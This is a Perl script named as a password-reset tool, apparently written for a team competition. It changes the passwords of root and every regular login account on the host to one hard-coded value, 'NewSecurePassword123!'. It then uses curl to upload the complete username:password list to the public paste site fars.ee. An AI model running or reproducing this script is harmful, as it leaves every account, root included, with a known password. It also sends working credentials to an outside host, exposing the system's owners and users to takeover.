#!/usr/bin/env perl

# usage: reset_passwords.pl

our @excluded_users = qw(git gold-team);

my @chars = ('a'..'z', 'A'..'Z', '0'..'9', qw(! @ $ % ^ & * 0 ( ) . ? / [ ] { } < > ; ' "));
sub get_pass { 'NewSecurePassword123!' }
# sub get_pass { join '', map { $chars[rand @chars] } 1..shift }

my @data = ();
while (my ($name, $passwd, $uid, $gid, $quota, $comment, $gcos, $home, $shell) = getpwent()) {
	next if $name ~~ @excluded_users;
	next if $shell =~ m{^/usr/s?bin/nologin$} && $gid != $uid;
	next if $uid <= 999 && $uid != 0;

	push @data, "$name:" . get_pass 13;
}

my $str = join "\n", @data, my $fh;
open($fh, '|-', $> == 0 ? 'chpasswd' : 'sudo chpasswd') or die "can't open chpasswd pipe: $!";
print $fh $str;
close $fh;

open($fh, '|-', 'curl -F "c=@-" "https://fars.ee/?u=1"') or die "can't open curl pipe: $!";
print $fh $str;
close $fh;
